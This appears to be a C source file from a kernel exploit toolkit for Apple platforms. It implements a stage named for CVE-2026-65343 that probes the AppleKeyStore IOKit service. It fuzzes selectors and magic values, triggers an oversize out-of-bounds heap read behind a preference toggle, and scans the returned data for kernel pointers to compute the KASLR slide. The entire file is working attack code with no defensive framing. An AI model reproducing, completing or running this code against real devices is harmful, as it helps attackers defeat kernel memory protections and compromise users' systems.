#include "exploit.h"
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CFPreferences.h>
#include <CoreFoundation/CFNumber.h>

static int pref_bool(const char *key) {
    CFStringRef ks = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
    if (!ks) return 0;
    CFTypeRef v = CFPreferencesCopyAppValue(ks, kCFPreferencesCurrentApplication);
    CFRelease(ks);
    if (!v) return 0;
    int on = 0;
    if (CFGetTypeID(v) == CFBooleanGetTypeID())
        on = CFBooleanGetValue((CFBooleanRef)v) ? 1 : 0;
    CFRelease(v);
    return on;
}

static int scan_kptrs(const uint8_t *buf, size_t n, uint32_t sel, size_t len) {
    int found = 0;
    for (size_t off = 0; off + 8 <= n; off += 8) {
        uint64_t v;
        memcpy(&v, buf + off, 8);
        uint32_t hi = (uint32_t)(v >> 32);
        if (hi == 0xfffffff0 || hi == 0xfffffe00) {
            nk_log("[+] AKS LEAK sel=%u len=0x%zx off=%zu ptr=0x%016llx%s",
                sel, len, off, (unsigned long long)v,
                ((v & 0xFFFFULL) == 0) ? " (round)" : "");
			if ((v & 0xFFFFULL) == 0 && !g_nk.slide) {
				if (nk_kaslr_from_known_leak(v, PRE_SLIDE_TEXT) == 0) {
					nk_log("[+] AKS: слайд из утечки slide=0x%llx base=0x%llx",
					    (unsigned long long)g_nk.slide,
					    (unsigned long long)g_nk.base);
				} else {
					nk_log("[!] AKS: round ptr 0x%016llx не принят как base",
					    (unsigned long long)v);
				}
			}
            found++;
        }
    }
    return found;
}

void nk_cve_2026_65343_kaslr(void) {
    nk_log("[CVE-2026-65343] AppleKeyStore stage (gated)");
    io_service_t svc = IOServiceGetMatchingService(
        kIOMasterPortDefault, IOServiceMatching("AppleKeyStore"));
    if (svc == IO_OBJECT_NULL) {
        nk_log("[-] AppleKeyStore not found");
        return;
    }
    io_connect_t conn = 0;
    if (IOServiceOpen(svc, mach_task_self(), 0, &conn) != KERN_SUCCESS) {
        nk_log("[-] AppleKeyStore open failed");
        IOObjectRelease(svc);
        return;
    }

    static uint8_t payload[256];
    static uint8_t out[4096];

    nk_log("[aks A] benign length map, sel 0..15, len=0x80");
    for (uint32_t sel = 0; sel < 16; sel++) {
        memset(payload, 0, sizeof(payload));
        uint32_t *p32 = (uint32_t *)payload;
        p32[0] = 0x53455043;
        p32[1] = 0x00000001;
        p32[2] = 0x00000080;
        memset(out, 0xBB, sizeof(out));
        size_t out_sz = sizeof(out);
        kern_return_t kr = IOConnectCallStructMethod(
            conn, sel, payload, 0x80, out, &out_sz);
        int mut = 0;
        size_t lim = out_sz < sizeof(out) ? out_sz : sizeof(out);
        for (size_t i = 0; i < lim; i++)
            if (out[i] != 0xBB) mut++;
        nk_log("[aks A] sel=%u kr=0x%x out=%zu mut=%d head=%02x%02x%02x%02x%02x%02x%02x%02x",
            sel, kr, out_sz, mut,
            out[0], out[1], out[2], out[3], out[4], out[5], out[6], out[7]);
        if (kr == KERN_SUCCESS && mut)
            scan_kptrs(out, lim, sel, 0x80);
    }

    nk_log("[aks A2] magic x cmd probe on live sels 0/1, benign len=0x80");
    static const uint32_t magics[5] = {
        0x53455043, 0x4C696253, 0x43505345, 0x00000001, 0xFFFFFFFF
    };
    int a2_hits = 0;
    for (uint32_t sel = 0; sel <= 1; sel++) {
        for (size_t mi = 0; mi < 5; mi++) {
            for (uint32_t cmd = 0; cmd < 32; cmd++) {
                memset(payload, 0, sizeof(payload));
                uint32_t *p32 = (uint32_t *)payload;
                p32[0] = magics[mi];
                p32[1] = cmd;
                p32[2] = 0x00000080;
                memset(out, 0, sizeof(out));
                size_t out_sz = sizeof(out);
                kern_return_t kr = IOConnectCallStructMethod(
                    conn, sel, payload, 0x80, out, &out_sz);
                int nonzero = 0;
                size_t lim = out_sz < sizeof(out) ? out_sz : sizeof(out);
                for (size_t i = 0; i < lim; i++) {
                    if (out[i]) { nonzero = 1; break; }
                }
                if (kr != KERN_SUCCESS || nonzero) {
                    a2_hits++;
                    nk_log("[aks A2] sel=%u magic=0x%08x cmd=%u kr=0x%x out=%zu head=%02x%02x%02x%02x%02x%02x%02x%02x",
                        sel, magics[mi], cmd, kr, out_sz,
                        out[0], out[1], out[2], out[3],
                        out[4], out[5], out[6], out[7]);
                    if (nonzero)
                        scan_kptrs(out, lim, sel, 0x80);
                }
            }
        }
    }
    if (a2_hits == 0)
        nk_log("[aks A2] all 320 combos: kr=0, output all-zero — response hardcoded zero");

    if (!pref_bool("unsafe_aks_oversize")) {
        nk_log("[aks B] oversize trigger locked (toggle unsafe_aks_oversize to arm)");
        IOServiceClose(conn);
        IOObjectRelease(svc);
        return;
    }

    static const size_t lens[4] = { 0x100, 0x200, 0x300, 0x400 };
    static const uint32_t bm[2] = { 0x53455043, 0x4C696253 };
    for (size_t li = 0; li < 4; li++) {
        for (size_t mi = 0; mi < 2; mi++) {
            nk_log("[aks B] PANIC-RISK(LOW, OOB heap read) arming len=0x%zx magic=0x%08x sels 0/1",
                lens[li], bm[mi]);
            for (uint32_t sel = 0; sel <= 1; sel++) {
                memset(payload, 0, sizeof(payload));
                uint32_t *p32 = (uint32_t *)payload;
                p32[0] = bm[mi];
                p32[1] = 0x00000001;
                p32[2] = (uint32_t)lens[li];
                p32[4] = (uint32_t)lens[li];
                memset(out, 0, sizeof(out));
                size_t out_sz = sizeof(out);
                kern_return_t kr = IOConnectCallStructMethod(
                    conn, sel, payload, sizeof(payload), out, &out_sz);
                if (kr != KERN_SUCCESS) {
                    nk_log("[aks B] sel=%u kr=0x%x (reject)", sel, kr);
                    continue;
                }
                size_t lim = out_sz < sizeof(out) ? out_sz : sizeof(out);
                int nz = 0;
                for (size_t i = 0; i < lim; i++) { if (out[i]) { nz = 1; break; } }
                nk_log("[aks B] sel=%u kr=0x0 out=%zu nonzero=%d head=%02x%02x%02x%02x%02x%02x%02x%02x",
                    sel, out_sz, nz,
                    out[0], out[1], out[2], out[3],
                    out[4], out[5], out[6], out[7]);
                if (nz) {
                    if (scan_kptrs(out, lim, sel, lens[li]) && g_nk.base) {
                        nk_log("[+] AKS KASLR leak locked at len=0x%zx sel=%u — stopping", lens[li], sel);
                        IOServiceClose(conn);
                        IOObjectRelease(svc);
                        return;
                    }
                }
            }
        }
    }

    IOServiceClose(conn);
    IOObjectRelease(svc);
    nk_log("[CVE-2026-65343] done base=0x%llx", (unsigned long long)g_nk.base);
}
